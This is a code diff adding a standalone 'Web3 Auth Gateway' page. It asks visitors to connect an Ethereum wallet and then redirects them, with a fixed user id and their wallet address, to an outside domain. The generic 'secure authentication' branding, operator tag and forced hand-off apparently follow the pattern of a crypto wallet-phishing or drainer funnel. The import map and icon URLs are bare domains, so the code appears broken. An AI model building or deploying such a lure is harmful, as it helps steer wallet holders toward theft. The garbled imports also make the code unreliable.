@@ -1,1 +1,72 @@
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Web3 Auth Gateway</title>
+      <style>
+          body { background: #111827; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+          .auth-card { background: #1f2937; padding: 2.5rem; border-radius: 12px; text-align: center; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+          h2 { margin-bottom: 1rem; color: #f3f4f6; }
+          p { color: #9ca3af; font-size: 0.9rem; margin-bottom: 2rem; }
+      </style>
+  </head>
+  <body>
+  
+  <div class="auth-card">
+      <h2>Secure Authentication</h2>
+      <p>Please connect your decentralized wallet to access your live dashboard panels.</p>
+      
+      <!-- AppKit custom button target element -->
+      <appkit-button></appkit-button>
+  </div>
+  
+  <!-- 📦 Explicit Import Maps for Single-File ESM execution -->
+  <script type="importmap">
+    {
+      "imports": {
+        "@reown/appkit": "https://esm.sh",
+        "@reown/appkit-adapter-ethers": "https://esm.sh"
+      }
+    }
+  </script>
+  
+  <script type="module">
+      import { createAppKit, EthersAdapter } from '@reown/appkit';
+      
+      const mainnet = {
+        id: 1,
+        name: 'Ethereum',
+        network: 'homestead',
+        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+        rpcUrls: { default: { http: ['https://cloudflare-eth.com'] } }
+      };
+  
+      // The destination endpoint where your Flask application is hosted
+      const TARGET_DASHBOARD = "https://roton.store";
+  
+      const modal = createAppKit({
+          adapters: [new EthersAdapter()],
+          networks: [mainnet],
+          metadata: {
+              name: 'Production Gateway',
+              description: 'Secure Bridge Authorization Routing Node',
+              url: window.location.origin,
+              icons: ['https://githubusercontent.com']
+          },
+          projectId: 'db6af3372f722385b2e4c5df24341c63', 
+          features: { analytics: false }
+      });
+  
+      // Monitor account tracking matrix for valid connections
+      modal.subscribeAccount(state => {
+          if (state.isConnected && state.address) {
+              // Forward the active parameters straight back to your VPS app instance
+              window.location.href = `${TARGET_DASHBOARD}?userid=gvjvb&wallet=${state.address.toLowerCase().trim()}&walletname=AppKit`;
+          }
+      });
+  </script>
+  
+  </body>
+  </html>
 
